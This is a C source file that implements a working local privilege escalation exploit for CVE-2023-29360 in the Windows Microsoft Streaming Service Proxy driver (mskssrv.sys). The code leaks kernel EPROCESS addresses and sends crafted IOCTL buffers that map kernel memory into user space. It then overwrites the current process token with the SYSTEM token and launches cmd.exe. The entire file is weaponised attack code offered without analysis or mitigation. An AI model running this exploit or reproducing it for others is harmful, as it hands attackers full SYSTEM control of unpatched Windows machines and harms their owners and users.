#define __STREAMS__
#include "CVE-2023-29360.h"
#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <string>
#include <stdlib.h>
#include <SetupAPI.h>
#include <cfgmgr32.h>
#include <objbase.h>
#include <ks.h>
#include <Dshow.h>
#include <ksproxy.h>

#pragma comment(lib, "Setupapi.lib")
#pragma comment(lib, "Ksproxy.lib")

CHAR InstanceId[MAX_DEVICE_ID_LEN];

void KDebugBreak()
{
	printf("[!] Triggering DebugBreak()!\n");
	getchar();
	DebugBreak();
}

void GetGUID() {

	HDEVINFO DeviceInfoSet = SetupDiGetClassDevsA(NULL, NULL, NULL, DIGCF_ALLCLASSES | DIGCF_PROFILE);
	if (DeviceInfoSet == INVALID_HANDLE_VALUE) {
		printf("[!] Error while calling SetupDiGetClassDevsA: %d\n", GetLastError());
		exit(1);
	}

	SP_DEVINFO_DATA DeviceInfoData;
	ZeroMemory(&DeviceInfoData, sizeof(SP_DEVINFO_DATA));
	DeviceInfoData.cbSize = sizeof(SP_DEVINFO_DATA);
	DWORD DeviceIndex = 0;

	while (SetupDiEnumDeviceInfo(DeviceInfoSet, DeviceIndex, &DeviceInfoData)) {

		DeviceIndex++;
		DWORD dwSize, dwPropertyRegDataType;
		CHAR szDesc[1024], szHardwareIDs[4096];
		CHAR ms_streaming[] = "Microsoft Streaming Service Proxy";
		SetupDiGetDeviceRegistryPropertyA(DeviceInfoSet, &DeviceInfoData, SPDRP_DEVICEDESC, &dwPropertyRegDataType, (BYTE*)szDesc, sizeof(szDesc), &dwSize);
		//printf("Device Description: %s\n", szDesc);

		int result = strcmp(szDesc, ms_streaming);
		if (result == 0) {
			printf("[+] Device Description: %s\n", szDesc);
			SetupDiGetDeviceRegistryPropertyA(DeviceInfoSet, &DeviceInfoData, SPDRP_HARDWAREID, &dwPropertyRegDataType, (BYTE*)szHardwareIDs, sizeof(szHardwareIDs), &dwSize);
			LPSTR pszId;
			printf("Hardware IDs:\n");

			for (pszId = szHardwareIDs;
				*pszId != TEXT('\0') && pszId + dwSize / sizeof(CHAR) <= szHardwareIDs + ARRAYSIZE(szHardwareIDs);
				pszId += strlen(pszId) + 1) {

				printf("        \"%s\"\n", pszId);
			}

			CHAR deviceInstanceId[MAX_DEVICE_ID_LEN];
			DWORD requiredSize = 0;
			if (SetupDiGetDeviceInstanceIdA(DeviceInfoSet, &DeviceInfoData, deviceInstanceId, sizeof(deviceInstanceId), &requiredSize)) {
				printf("[+] Device Instance ID: %s\n", deviceInstanceId);
				CHAR deviceInstanceIdSplit[MAX_DEVICE_ID_LEN];
				strncpy_s(deviceInstanceIdSplit, MAX_DEVICE_ID_LEN, deviceInstanceId, MAX_DEVICE_ID_LEN);

				char* context = NULL;
				char* lastToken = NULL;
				const char* delimiter = "\\";
				char* token = strtok_s(deviceInstanceIdSplit, delimiter, &context);

				while (token != NULL) {
					lastToken = token;
					token = strtok_s(NULL, delimiter, &context);
				}
				strncpy_s(InstanceId, MAX_DEVICE_ID_LEN, lastToken, MAX_DEVICE_ID_LEN);

			}
			else {
				printf("[!] Error while calling SetupDiGetDeviceInstanceId: %d\n", GetLastError());
				exit(1);
			}
		}
	}
}

ULONGLONG GetCurrentToken(DWORD pid)
{

	HANDLE PHandle;
	if (pid == 0x00000004)
	{
		PHandle = (HANDLE)0x00000004;
	}
	else
	{
		PHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	}


	NTSTATUS nt_status;
	_NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
	if (!pNtQuerySystemInformation)
	{
		printf("[!] Error while resolving NtQuerySystemInformation: %d\n", GetLastError());
		exit(1);
	}

	ULONG system_handle_info_size = 4096;
	PSYSTEM_HANDLE_INFORMATION system_handle_info = (PSYSTEM_HANDLE_INFORMATION)malloc(system_handle_info_size);
	memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((nt_status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 10);
		if (system_handle_info == NULL)
		{
			printf("[!] Error while allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			exit(1);
		}
	}
	if (nt_status != 0x0)
	{
		printf("[!] Error while calling NtQuerySystemInformation to obtain the SystemHandleInformation.\n");
		exit(1);
	}

	int z = 0;
	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if (system_handle_info->Handles[i].UniqueProcessId == pid)
		{
			if ((HANDLE)system_handle_info->Handles[i].HandleValue == PHandle)
			{
				return (ULONGLONG)system_handle_info->Handles[i].Object;
			}
		}
	}

	return 0;
}

BOOL FSInitializeContextRendezvous(HANDLE hDevice)
{
	ULONGLONG InputBuffer = 0x000000001a000000;
	LPVOID alloc = VirtualAlloc((LPVOID)InputBuffer, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (alloc == NULL)
	{
		printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
		return FALSE;
	}
	memset(alloc, 0x90, 0x1000);
	((PDWORD64)((DWORD64)InputBuffer + 0x00))[0] = 0x4141414141414141;
	((PDWORD64)((DWORD64)InputBuffer + 0x08))[0] = 0x4242424242424242;
	((PDWORD64)((DWORD64)InputBuffer + 0x10))[0] = 0x0000000000001337;
	((PDWORD64)((DWORD64)InputBuffer + 0x18))[0] = 0x0000000000000000;


	BOOL DeviceIoStatus = DeviceIoControl(hDevice, MSKSSRV_IOCTL_INIT_CONTEXT, (LPVOID)InputBuffer, 0x100, NULL, 0, NULL, NULL);
	if (DeviceIoStatus == TRUE)
	{
		return TRUE;
	}
	else
	{
		printf("[!] Error while calling FSInitializeContextRendezvous.\n");
		return FALSE;
	}
}

BOOL FSRendezvousServer_InitializeStream(HANDLE hDevice)
{
	HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);

	ULONGLONG InputBuffer = 0x000000001a020000;
	LPVOID alloc = VirtualAlloc((LPVOID)InputBuffer, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (alloc == NULL)
	{
		printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
		return FALSE;
	}
	memset(alloc, 0x98, 0x1000);
	((PDWORD64)((DWORD64)InputBuffer + 0x00))[0] = 0x3131313131313131;
	((PDWORD64)((DWORD64)InputBuffer + 0x08))[0] = GetCurrentProcessId();
	((PDWORD64)((DWORD64)InputBuffer + 0x10))[0] = 0x0000000000001337;
	((PDWORD64)((DWORD64)InputBuffer + 0x18))[0] = 0x0000007898989898;
	((PDWORD64)((DWORD64)InputBuffer + 0x20))[0] = 0x9898989800080000;
	((PDWORD64)((DWORD64)InputBuffer + 0x28))[0] = (ULONGLONG)hEvent;

	BOOL DeviceIoStatus = DeviceIoControl(hDevice, MSKSSRV_IOCTL_INIT_STREAM, (LPVOID)InputBuffer, 0x100, NULL, 0, NULL, NULL);
	if (DeviceIoStatus == TRUE)
	{
		return TRUE;
	}
	else
	{
		printf("[!] Error while calling FSInitializeContextRendezvous.\n");
		return FALSE;
	}
}

BOOL FSRendezvousServer_RegisterStream(HANDLE hDevice)
{
	HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);

	ULONGLONG InputBuffer = 0x000000001a040000;
	LPVOID alloc = VirtualAlloc((LPVOID)InputBuffer, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (alloc == NULL)
	{
		printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
		return FALSE;
	}
	memset(alloc, 0x95, 0x1000);
	((PDWORD64)((DWORD64)InputBuffer + 0x00))[0] = 0x0000000000000002;
	((PDWORD64)((DWORD64)InputBuffer + 0x08))[0] = GetCurrentProcessId();
	((PDWORD64)((DWORD64)InputBuffer + 0x10))[0] = 0x0000000000001337;
	((PDWORD64)((DWORD64)InputBuffer + 0x18))[0] = 0x0000007898989898;
	((PDWORD64)((DWORD64)InputBuffer + 0x28))[0] = (ULONGLONG)hEvent;

	BOOL DeviceIoStatus = DeviceIoControl(hDevice, MSKSSRV_IOCTL_REGISTER_STREAM, (LPVOID)InputBuffer, 0x100, NULL, 0, NULL, NULL);
	if (DeviceIoStatus == TRUE)
	{
		return TRUE;
	}
	else
	{
		printf("[!] Error while calling FSRendezvousServer_RegisterStream.\n");
		return FALSE;
	}
}

BOOL FSRendezvousServer_PublishTx(HANDLE hDevice, ULONGLONG map_address1, ULONGLONG map_address2)
{
	ULONGLONG MLDMemory = 0x000000001b000000;
	LPVOID allocMLDMemory = VirtualAlloc((LPVOID)MLDMemory, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (allocMLDMemory == NULL)
	{
		printf("[!] Error while allocating memory for the MDL buffer: %d\n", GetLastError());
		return FALSE;
	}
	memset(allocMLDMemory, 0x45, 0x1000);

	ULONGLONG InputBuffer = 0x000000001a010000;
	LPVOID alloc = VirtualAlloc((LPVOID)InputBuffer, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (alloc == NULL)
	{
		printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
		return FALSE;
	}
	memset(alloc, 0x99, 0x1000);
	((PDWORD64)((DWORD64)InputBuffer + 0x00))[0] = 0x1111111111111111;
	((PDWORD64)((DWORD64)InputBuffer + 0x08))[0] = 0x1212121212121212;
	((PDWORD64)((DWORD64)InputBuffer + 0x20))[0] = 0x0000000100000003;
	((PDWORD64)((DWORD64)InputBuffer + 0x48))[0] = map_address1;		// First Memory Address (RW)
	((PDWORD64)((DWORD64)InputBuffer + 0x58))[0] = 0x0000100099999999;	// First Size
	((PDWORD64)((DWORD64)InputBuffer + 0x60))[0] = map_address2;		// Second Memory Address (R)
	((PDWORD64)((DWORD64)InputBuffer + 0x68))[0] = 0x0000100099999999;	// Second Size
	((PDWORD64)((DWORD64)InputBuffer + 0x70))[0] = 0x9999999900000004;

	DWORD InputBufferLength = (0x00000003 - 0x01) * 0x88 + 0xb0;

	BOOL DeviceIoStatus = DeviceIoControl(hDevice, MSKSSRV_IOCTL_PUBLISHTX, (LPVOID)InputBuffer, InputBufferLength, NULL, 0, NULL, NULL);
	if (DeviceIoStatus == TRUE)
	{
		return TRUE;
	}
	else
	{
		printf("[!] Error while calling FSRendezvousServer_PublishTx.\n");
		return FALSE;
	}
}

BOOL FSRendezvousServer_ConsumeTx(HANDLE hDevice)
{
	ULONGLONG OutputBuffer = 0x000000001c000000;
	LPVOID allocOutputBuffer = VirtualAlloc((LPVOID)OutputBuffer, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (allocOutputBuffer == NULL)
	{
		printf("[!] Error while allocating memory for the output buffer: %d\n", GetLastError());
		return FALSE;
	}
	memset(allocOutputBuffer, 0x66, 0x1000);

	ULONGLONG InputBuffer = 0x000000001a030000;
	LPVOID alloc = VirtualAlloc((LPVOID)InputBuffer, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (alloc == NULL)
	{
		printf("[!] Error while allocating memory for the input buffer: %d\n", GetLastError());
		return FALSE;
	}
	memset(alloc, 0x96, 0x1000);
	((PDWORD64)((DWORD64)InputBuffer + 0x00))[0] = 0x5555555555555555;
	((PDWORD64)((DWORD64)InputBuffer + 0x08))[0] = 0x5656565656565656;
	((PDWORD64)((DWORD64)InputBuffer + 0x20))[0] = 0x0000000100000003;

	BOOL DeviceIoStatus = DeviceIoControl(hDevice, MSKSSRV_IOCTL_CONSUMETX, (LPVOID)InputBuffer, 0x1000, (LPVOID)OutputBuffer, 0x1000, NULL, NULL);
	if (DeviceIoStatus == TRUE)
	{
		ULONGLONG* mapped_address1 = (DWORD64*)(OutputBuffer + 0x48);
		ULONGLONG* mapped_address2 = (DWORD64*)(OutputBuffer + 0x60);
		printf("[+] First mapped _MDL: %llx\n", *mapped_address1);
		printf("[+] Second mapped _MDL: %llx\n", *mapped_address2);

		ULONGLONG* lpEPROCESS_ref = (DWORD64*)(*mapped_address1 + 0x4b8);
		ULONGLONG* hpEPROCESS_ref = (DWORD64*)(*mapped_address2 + 0x4b8);
		printf("[+] Unprivileged token reference: %llx\n", *lpEPROCESS_ref);
		printf("[+] System token reference: %llx\n", *hpEPROCESS_ref);

		//KDebugBreak();
		memcpy(lpEPROCESS_ref, hpEPROCESS_ref, 0x08);
		//KDebugBreak();

		system("cmd.exe");

		return TRUE;
	}
	else
	{
		printf("[!] Error while calling FSRendezvousServer_ConsumeTx.\n");
		return FALSE;
	}
}

int main() {

	// Get Device Instance ID
	GetGUID();
	GUID mskssrv_iid;
	SIZE_T pReturned = 0;
	wchar_t* guidString = (wchar_t*)malloc(MAX_DEVICE_ID_LEN);
	mbstowcs_s(&pReturned, guidString, MAX_DEVICE_ID_LEN, InstanceId, MAX_DEVICE_ID_LEN);
	IIDFromString(guidString, &mskssrv_iid);

	// Get _EPROCESS pointers
	DWORD CurrentPid = GetCurrentProcessId();
	ULONGLONG CurrentToken = GetCurrentToken(CurrentPid);
	if (CurrentToken == 0)
	{
		printf("[!] Error while getting the current EPROCESS\n");
		return 1;
	}

	DWORD SystemPid = 0x00000004;
	ULONGLONG SystemToken = GetCurrentToken(SystemPid);
	if (SystemToken == 0)
	{
		printf("[!] Error while getting the SYSTEM EPROCESS\n");
		return 1;
	}

	// Open handles to the device driver
	HRESULT HandleResult;
	HANDLE hMSKSSRV1;
	HandleResult = KsOpenDefaultDevice(mskssrv_iid, GENERIC_READ | GENERIC_WRITE, &hMSKSSRV1);
	if (HandleResult != NOERROR) {
		printf("[!] Error while calling KsDefaultDevice: %ld\n", GetLastError());
		return 1;
	}

	HANDLE hMSKSSRV2;
	HandleResult = KsOpenDefaultDevice(mskssrv_iid, GENERIC_READ | GENERIC_WRITE, &hMSKSSRV2);
	if (HandleResult != NOERROR) {
		printf("[!] Error while calling KsDefaultDevice: %ld\n", GetLastError());
		return 1;
	}

	HANDLE hMSKSSRV3;
	HandleResult = KsOpenDefaultDevice(mskssrv_iid, GENERIC_READ | GENERIC_WRITE, &hMSKSSRV3);
	if (HandleResult != NOERROR) {
		printf("[!] Error while calling KsDefaultDevice: %ld\n", GetLastError());
		return 1;
	}

	// Invoke the required routines to trigger the vulnerability
	BOOL return_value = FALSE;
	return_value = FSInitializeContextRendezvous(hMSKSSRV1);
	if (return_value == FALSE)
	{
		exit(1);
	}

	return_value = FALSE;
	return_value = FSRendezvousServer_InitializeStream(hMSKSSRV2);
	if (return_value == FALSE)
	{
		exit(1);
	}

	return_value = FALSE;
	return_value = FSRendezvousServer_RegisterStream(hMSKSSRV3);
	if (return_value == FALSE)
	{
		exit(1);
	}

	return_value = FALSE;
	return_value = FSRendezvousServer_PublishTx(hMSKSSRV3, CurrentToken, SystemToken);
	if (return_value == FALSE)
	{
		exit(1);
	}

	return_value = FALSE;
	return_value = FSRendezvousServer_ConsumeTx(hMSKSSRV3);
	if (return_value == FALSE)
	{
		exit(1);
	}

	return 0;
}